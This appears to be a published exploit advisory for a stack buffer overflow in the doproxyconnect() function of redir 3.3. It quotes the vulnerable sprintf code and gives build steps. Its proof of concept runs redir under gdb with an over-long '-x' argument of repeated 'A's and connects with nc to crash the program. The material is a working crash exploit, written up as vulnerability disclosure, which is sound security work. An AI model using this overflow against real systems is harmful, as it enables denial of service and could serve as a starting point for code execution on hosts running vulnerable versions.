# Date: 2020-01-14
# Exploit Author: hieubl from HPT Cyber Security
# Vendor Homepage: https://github.com/troglobit/redir

# Version: 3.3
# Tested on: Kali GNU/Linux Rolling 2019.4
# CVE : [if applicable]

The source code of redir.c contains doproxyconnect() function which
has the stack overflow vulnerability:

void doproxyconnect(int socket)
{
	int x;
	char buf[128];

	/* write CONNECT string to proxy */
	sprintf((char *)&buf, "CONNECT %s HTTP/1.0\n\n", connect_str);
	x = write(socket, (char *)&buf, strlen(buf));
	if (x < 1) {
		syslog(LOG_ERR, "Failed writing to proxy: %s", strerror(errno));
		exit(1);
	}
	/* now read result */
	x = read(socket, (char *)&buf, sizeof(buf));
	if (x < 1) {
		syslog(LOG_ERR, "Failed reading reply from proxy: %s", strerror(errno));
		exit(1);
	}
	/* no more error checking for now -- something should be added later */
	/* HTTP/1.0 200 Connection established */
}

Download and build:
# git clone https://github.com/troglobit/redir.git
# cd redir
# ./autogen.sh
# ./configure
# make

Proof of Concept:
  In 1st terminal:
    # gdb -q ./redir
    # set follow-fork-mode child
    # r -x AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
:1234 hpt.vn:80

  In 2nd terminal:
    # nc localhost 1234

  After that, the program in 1st terminal will crash because of buffer
overflow vulnerability.
